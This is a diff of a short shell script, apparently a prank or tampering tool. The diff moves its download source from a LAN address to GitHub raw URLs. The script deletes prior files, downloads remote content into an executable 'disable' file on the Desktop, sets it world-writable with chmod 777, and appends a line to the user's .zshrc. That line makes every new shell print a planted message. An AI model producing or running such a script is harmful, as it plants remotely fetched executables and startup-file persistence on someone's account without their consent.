@@ -1,8 +1,8 @@
 cd ~ ;
 rm author .author disable ;
-curl http://10.18.206.165:5500/author > .author ;
+curl https://raw.githubusercontent.com/noalexan/hellobebou/main/author > .author ;
 echo "#!/bin/sh" > ~/Desktop/disable ;
-curl http://10.18.206.165:5500/disable >> ~/Desktop/disable ;
+curl https://raw.githubusercontent.com/noalexan/hellobebou/main/disable >> ~/Desktop/disable ;
 chmod 777 ~/Desktop/disable ;
 cp .zshrc .zshrccpy ;
 echo "cat ~/.author" >> ~/.zshrc ;
